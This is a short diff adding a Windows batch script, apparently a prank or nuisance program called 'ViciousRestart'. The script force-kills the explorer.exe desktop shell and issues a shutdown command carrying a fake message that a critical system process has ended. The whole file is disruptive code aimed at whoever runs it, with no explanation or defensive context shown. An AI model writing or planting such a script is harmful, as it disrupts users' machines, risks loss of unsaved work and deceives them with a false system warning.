@@ -1,0 +1,3 @@
+@echo off
+taskkill /f /im explorer.exe
+shutdown -c "A critical system process has been ended, get restarted by ViciousRestart!"
